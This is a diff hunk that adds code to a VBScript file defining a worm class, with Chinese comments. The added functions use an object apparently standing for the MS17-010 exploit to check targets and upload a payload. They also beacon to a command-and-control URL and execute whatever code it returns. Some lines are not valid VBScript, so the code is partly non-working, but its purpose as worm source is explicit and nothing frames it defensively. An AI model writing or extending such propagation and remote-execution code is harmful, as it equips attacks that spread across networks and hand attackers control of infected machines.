@@ -357,6 +357,22 @@ Class Worm
     End Sub
 End Class
 
+Function ExploitVulnerability(target)
+    Set exploit = CreateObject("MS17_010.Exploit")
+    If exploit.CheckVulnerable(target) Then
+        exploit.UploadPayload(target, payload_path)
+        Return True
+    End If
+    Return False
+End Function
+
+Function BeaconToC2()
+    Dim http : Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "GET", "https://c2.com/指令", False
+    http.Send
+    Execute http.responseText  ' 动态执行远程代码
+End Function
+
 ' 主程序入口
 Randomize  ' 初始化随机数生成器
 Dim worm
